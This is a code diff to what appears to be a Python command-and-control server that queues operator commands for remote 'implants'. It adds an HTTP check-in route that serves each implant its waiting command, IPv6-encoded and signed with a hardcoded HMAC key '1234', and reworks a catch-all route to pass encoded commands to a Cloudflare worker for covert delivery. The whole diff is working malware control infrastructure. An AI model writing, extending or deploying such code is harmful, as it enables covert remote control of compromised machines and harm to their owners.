@@ -187,8 +187,8 @@ def handle_client(client_socket):
                 if token in operator_session_tokens:
                     command = command[0] if command else ""
                     add_command(implant_id, uname, command)
-                    client_socket.send("Message published\n".encode())
-                    logger.info(f"Message: {command} sent to implant_id: {implant_id}")
+                    client_socket.send("Command queued\n".encode())
+                    logger.info(f"Command: {command} added to queue for implant: {implant_id}")
                 else:
                     logger.error("bad token")
                     client_socket.send("Bad token\n".encode())
@@ -225,6 +225,34 @@ def handle_client(client_socket):
         client_socket.close()
 
 
+@app.route('/direct/<path:path>', methods=['GET'])
+def http_get(path):
+    """
+    Handles implants using basic HTTP for check-in
+    :param path: This represents the implant ID
+    :return: Either the waiting command or error
+    """
+    # Get the message FIFO
+    logger.info("GET incoming for basic HTTP listener URI")
+    try:
+        operator, command = get_waiting_command(path)
+        if operator and command is False:
+            logger.error("error")
+            return "error"
+        checkout_command(path, operator)
+        command = json.dumps(ipv6_encoder.string_to_ipv6(command))
+        logger.info("sending command and HMAC to implant")
+        hmac_k = hmac.new("1234".encode(), command.encode(), hashlib.sha256)
+        hmac_sig = hmac_k.hexdigest()
+        return jsonify(
+            message=command,
+            key=hmac_sig
+        )
+    except Exception as e:
+        logger.error(f"error: {e}")
+        return "error"
+
+
 @app.route('/<path:path>', methods=['GET'])
 def catch_all_get(path):
     """
@@ -233,21 +261,15 @@ def catch_all_get(path):
     :return: Either the waiting command or error
     """
     # Get the message FIFO
-    logger.info("GET incoming")
+    logger.info("GET incoming for DNS URI path")
     try:
         operator, command = get_waiting_command(path)
         if operator and command is False:
             logger.error("error")
             return "error"
         checkout_command(path, operator)
-        command = json.dumps(ipv6_encoder.string_to_ipv6(command))
-        logger.info("sending command to implant")
-        hmac_k = hmac.new("1234".encode(), command.encode(), hashlib.sha256)
-        hmac_sig = hmac_k.hexdigest()
-        return jsonify(
-            message=command,
-            key=hmac_sig
-        )
+        logger.info("sending IPv6 encoded command to CF worker")
+        return ipv6_encoder.string_to_ipv6(command)
     except Exception as e:
         logger.error(f"error: {e}")
         return "error"
